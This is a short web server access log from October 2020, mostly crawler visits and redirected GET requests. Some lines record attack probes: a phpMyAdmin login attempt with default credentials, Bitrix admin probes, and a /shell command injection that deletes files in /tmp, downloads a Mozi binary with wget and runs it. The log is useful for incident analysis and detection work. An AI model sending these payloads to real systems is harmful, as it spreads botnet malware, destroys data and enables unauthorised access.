207.46.13.53 - - [29/Oct/2020:06:26:53 +0200] "GET /robots.txt HTTP/1.1" 302 455 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
2.55.79.57 - - [29/Oct/2020:06:30:32 +0200] "GET /phpmyadmin/index.php?pma_username=wordpress&pma_password=wordpress HTTP/1.1" 302 571 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
95.174.110.235 - - [29/Oct/2020:06:31:58 +0200] "GET /bitrix/admin/index.php?login=yes HTTP/1.1" 302 443 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko"
95.174.110.235 - - [29/Oct/2020:06:31:59 +0200] "GET /bitrix/admin/index.php?login=yes HTTP/1.1" 302 443 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2766.7 Safari/537.36"
180.175.137.100 - - [29/Oct/2020:06:37:32 +0200] "GET / HTTP/1.1" 302 435 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
45.153.203.175 - - [29/Oct/2020:07:07:14 +0200] "GET / HTTP/1.1" 302 398 "-" "Linux Gnu (cow)"
207.46.13.53 - - [29/Oct/2020:07:27:58 +0200] "GET /robots.txt HTTP/1.1" 302 455 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
103.215.54.175 - - [29/Oct/2020:07:35:29 +0200] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 302 619 "-" "Hello, world"
212.193.117.226 - - [29/Oct/2020:07:49:24 +0200] "GET / HTTP/1.1" 302 435 "" "Mozilla/5.0 (compatible; tldstat.com/Bot; +http://tldstat.com/bot.html)"
178.128.0.34 - - [29/Oct/2020:07:50:05 +0200] "GET / HTTP/1.1" 302 379 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
178.128.0.34 - - [29/Oct/2020:07:50:11 +0200] "GET / HTTP/1.1" 302 379 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
178.128.0.34 - - [29/Oct/2020:07:50:13 +0200] "GET /.well-known/security.txt HTTP/1.1" 302 427 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
